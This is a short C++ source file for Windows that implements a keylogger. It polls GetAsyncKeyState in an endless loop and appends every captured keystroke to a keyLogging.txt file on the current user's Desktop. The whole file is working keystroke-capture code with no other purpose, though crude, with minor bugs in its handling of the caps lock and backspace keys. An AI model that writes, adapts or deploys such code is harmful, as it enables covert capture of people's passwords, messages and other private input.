#include <iostream>
#include <fstream>
#include <windows.h>
#include <Lmcons.h>
#include <stdlib.h>
#include <string.h>


std::string getFilePath()
{
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);

	std::string strtmp(&username[0], &username[(int)size-1]);

	std::string path = "C:\\Users\\" + strtmp + "\\Desktop\\keyLogging.txt";

	std::cout << path;

    return path;
}

bool clickedSpecialKey(int key, std::ofstream& logFile) 
{
	if (key == VK_BACK)
	{
		long currentPosition = logFile.tellp();
		logFile.seekp(currentPosition - 2);
		logFile.write("", 1);
		logFile.close();
		return true;
	}
	if (key == VK_CAPITAL)
	{
		return true;
	}
	return false;
}



int main()
{
    std::string path = getFilePath();
	 
    std::ofstream logFile(path);

	char keyPress = 'k';

	while (true) {
		Sleep(10);
		for (int keyPress = 8; keyPress <= 190; keyPress++)
		{
			if (GetAsyncKeyState(keyPress) == -32767) 
			{
				logFile.open(path, std::fstream::app);
				if (clickedSpecialKey(keyPress, logFile) == false)
				{
					logFile << char(keyPress);
					logFile.close();
				}
			}
		}
	}

    return 0; 
}

